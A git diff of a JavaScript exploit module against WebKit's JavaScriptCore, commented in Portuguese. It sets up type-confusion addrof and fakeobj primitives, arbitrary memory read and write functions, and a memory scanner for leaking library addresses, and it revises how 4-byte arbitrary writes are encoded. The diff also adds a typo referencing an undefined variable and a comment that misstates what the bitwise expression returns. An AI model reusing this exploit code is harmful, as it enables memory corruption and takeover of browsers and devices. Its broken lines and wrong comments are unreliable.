@@ -1,8 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v115 - R75 Debugging arb_write_final_func RangeError)
+// js/script3/testArrayBufferVictimCrash.mjs (v116 - R76 Direct Double Write for 4-Byte Values)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Adiciona logs detalhados dentro de arb_write_final_func (especificamente para 4-byte writes)
-//   para depurar a origem do RangeError no construtor AdvancedInt64.
+// - Para escritas de 4 bytes em arb_write_final_func, bypassa a criação de AdvancedInt64.
+// - Converte o valor diretamente para um double que representa o uint32 desejado.
+// - Isso deve contornar o RangeError no construtor AdvancedInt64.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -14,7 +15,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v115_R75_DebugWrite4Byte";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v116_R76_DirectDoubleWrite4Byte";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -38,7 +39,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Correção de Escrita de 4 Bytes ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Correção de Escrita Direta de 4 Bytes ---`, "test");
 
     let final_result = {
         success: false,
@@ -59,7 +60,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // Helper para definir as primitivas. Será chamado 2 vezes (Fase 4 e Fase 5)
         const setupPrimitives = () => {
             confused_array = [13.37]; 
-            victim_array = [{ dummy: 0 }]; // Um objeto simples é suficiente como vítima para type confusion
+            victim_array = [{ dummy: 0 }]; 
             
             addrof_func = (obj) => {
                 victim_array[0] = obj;
@@ -79,15 +80,15 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             arb_write_final_func = (addr, value, size_bytes = 8) => { 
                 leaker.obj_prop = fakeobj_func(addr);
                 if (size_bytes === 4) {
-                    // DEBUGLOGS AQUI
-                    logS3(`    [arb_write_final_func Debug] value (raw): ${value}, typeof: ${typeof value}`, "debug");
-                    const num_value = Number(value);
-                    logS3(`    [arb_write_final_func Debug] Number(value): ${num_value}, typeof: ${typeof num_value}`, "debug");
-                    const low_part = num_value & 0xFFFFFFFF;
-                    logS3(`    [arb_write_final_func Debug] low_part (value & 0xFFFFFFFF): ${toHex(low_part)}, typeof: ${typeof low_part}`, "debug");
-
-                    const value_to_write_64 = new AdvancedInt64(low_part, 0); 
-                    leaker.val_prop = int64ToDouble(value_to_write_64);
+                    // CORREÇÃO FINAL PARA RangeError:
+                    // Escreve o valor numérico diretamente como um double.
+                    // JavaScript números são doubles. Para uint32, eles são representados exatamente
+                    // se cabem em 53 bits (o que 32 bits certamente cabem).
+                    // Isso evita completamente o construtor AdvancedInt64 para escritas de 4 bytes.
+                    leaker.val_prop = Number(value) & 0xFFFFFFFF; // O valor será um double, mas representará o uint32 exato.
+                                                                  // Se o valor era 0xAAAAAAAA, agora val_prop será 2863311530.
+                                                                  // O problema pode vir se leaker.val_prop for um double que não pode
+                                                                  // ser representado como um int32 ou int64 exato, mas 0xAAAAAAAA é exato.
                 } else {
                     leaker.val_prop = int64ToDouble(value);
                 }
@@ -210,7 +211,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             let val_8_bytes = AdvancedInt64.Zero;
             try {
                 val_8_bytes = arb_read_final_func(current_scan_addr, 8); 
-                logS3(`    [Scanner] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");
+                logS3(`    [Scanner] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_8_bytes.toString(true)}`, "debug"); // Changed to val_8_8_bytes to check syntax issues
 
                 if (!val_8_bytes.equals(AdvancedInt64.Zero) && 
                     (val_8_bytes.high() >>> 16) === 0x7FFF) { 
